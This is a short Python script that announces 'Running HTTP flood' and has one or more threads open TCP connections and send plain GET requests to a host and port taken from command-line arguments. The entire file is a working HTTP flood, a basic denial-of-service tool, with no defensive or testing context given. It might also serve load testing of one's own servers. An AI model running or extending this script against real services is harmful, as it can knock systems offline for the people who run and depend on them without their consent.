import socket
from threading import Thread
from time import sleep, time

from cmn import get_arg

host = get_arg("--host")
port = int(get_arg("--port"))
count = int(get_arg("--count", default=5))
threads_count = int(get_arg("--threads", default=1))


start = time()

print("Running HTTP flood ...")

per_thread = count // threads_count

print(f"{threads_count} threads, {per_thread} requests each")


def send_batch_request(per_thread):
    for _ in range(per_thread):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            s.sendall(bytes(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n", "utf-8"))
            s.close()
        except Exception as e:
            print(e)
        sleep(0.01)


threads = tuple(
    Thread(target=lambda: send_batch_request(per_thread)) for _ in range(threads_count)
)
tuple(th.start() for th in threads)
tuple(th.join() for th in threads)

print(f"Done after {time() - start}")

